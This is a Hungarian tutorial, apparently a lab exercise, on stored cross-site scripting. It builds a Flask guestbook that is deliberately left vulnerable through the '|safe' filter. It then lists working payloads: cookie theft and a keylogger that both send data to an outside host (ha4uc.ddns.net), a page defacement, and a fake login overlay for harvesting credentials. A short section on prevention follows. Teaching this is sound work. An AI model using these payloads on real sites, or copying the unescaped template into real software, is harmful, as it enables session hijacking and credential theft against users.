# Cross-Site Scripting (XSS)

## Rendszerterv

Az XSS-t egy egyszerű (egyetlen fájlból álló) Flask webalkalmazáson
keresztül fogjuk megvizsgálni. Ehhez szükségünk van a Flask csomagra,
amit egy `venv`-ben fogunk telepíteni. 

## Venv létrehozása, aktiválása és a Flask telepítése

Először szükség van a venv csomagra (ezt telepíti az első sor). A második
sor egy virtualenv környezetet hoz létre, amiben a rendszertől függetlenül
tudunk Python PIP csomagokat telepíteni. A harmadik sor belép a virtuális
környezetbe, majd a negyedik sor akvitálja azt. Végül az ötödik sor
telepíti a flask PIP csomagot.

```bash
sudo apt install python3-venv
python3 -m venv xss
cd xss
. bin/activate
pip install flask
```

## A webalkalmazás létrehozása

Ezután elhelyezhetjük az egyfájlos Python Flask webalkalmazást az `app.py`
fájlban.

```bash
cat > app.py
```

Ez az `app.py` fájl tartalma:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

comments = []

TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Guestbook</title>
</head>
<body>
    <h1>Guestbook</h1>
    <p>New comment</p>
    
    <form method="POST">
        <textarea id="comment" name="comment" rows="4" cols="50"></textarea><br>
        <input type="submit" value="Submit">
    </form>
    
    <h2>Comments:</h2>
    <ul>
        {% for comment in comments %}
            <li>{{ comment | safe }}</li>  <!-- Intentionally using |safe to demonstrate XSS vulnerability -->
        {% endfor %}
    </ul>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        comment = request.form.get('comment')
        if comment:
            comments.append(comment)
    return render_template_string(TEMPLATE, comments=comments)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
```

A bevitel végén egy üres sorban Ctrl-D jelzi a bevitel végét. Ezt követően így futtathatjuk
a webalkalmazást:

```bash
python app.py
```

## A támadás menete

A webalkalmazás most az 5000-es porton érhető el. A vendégkönyv funkció megfelelően
működik, nincsenek szűrve a HTML elemek, így a szöveget formázhatjuk is. A HTML elemek
elhelyezésének lehetősége viszont XSS típusú támadásra ad lehetőséget.

### Cookie-k ellopása

```html
<script>
new Image().src = "http://ha4uc.ddns.net:5000/img?data=" + btoa(document.cookie);
</script>
```

### Oldal felülírása (deface)

```html
<script>
document.body.innerHTML = '<h1 style="color:red;text-align:center;font-size:80px;margin-top:200px;">HACKED!</h1>';
</script>
```

### Belépési adatok ellopása

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border-radius:10px;text-align:center;">
    <h2>Session Expired</h2>
    <p>Please log in again to continue</p>
    <input type="text" placeholder="Username" style="display:block;margin:10px auto;width:200px;padding:8px;"><br>
    <input type="password" placeholder="Password" style="display:block;margin:10px auto;width:200px;padding:8px;"><br>
    <button onclick="alert('Credentials stolen!');">Login</button>
  </div>
</div>
```

### Keylogger

```html
<script>
document.onkeypress = function(e) {
  new Image().src = "http://ha4uc.ddns.net:5000/img?data=" + btoa(e.key);
};
</script>
```

## Hogyan kerülhető el?

A felhasználó által bevitt adatok szűrése. Erre számos rendszer beépített védelemmel
rendelkezik (például itt a `| safe` törlése az összes HTML elemet letiltja.) Bizonyos
HTML elemek engedélyezésére viszont bizonyos esetekben szükség lehet, tehát
az átfogó megoldás ennyire nem kézenfekvő.

